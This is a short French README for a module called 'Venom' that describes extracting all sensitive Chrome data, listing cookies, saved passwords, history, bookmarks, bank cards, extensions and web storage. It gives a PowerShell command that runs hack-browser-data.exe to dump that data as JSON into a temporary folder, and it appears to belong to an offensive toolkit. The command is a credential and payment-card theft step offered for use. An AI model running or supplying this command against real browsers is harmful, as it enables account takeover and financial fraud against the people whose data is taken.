# Browser Data Extractor - Module Venom

## Description

Ce module extrait **toutes** les données sensibles de Chrome :

- Cookies
- Mots de passe
- Historique
- Favoris
- Cartes bancaires
- Extensions
- LocalStorage / SessionStorage

## Commande

```powershell
.\hack-browser-data.exe -b chrome -f json --dir %TEMP%\browser_data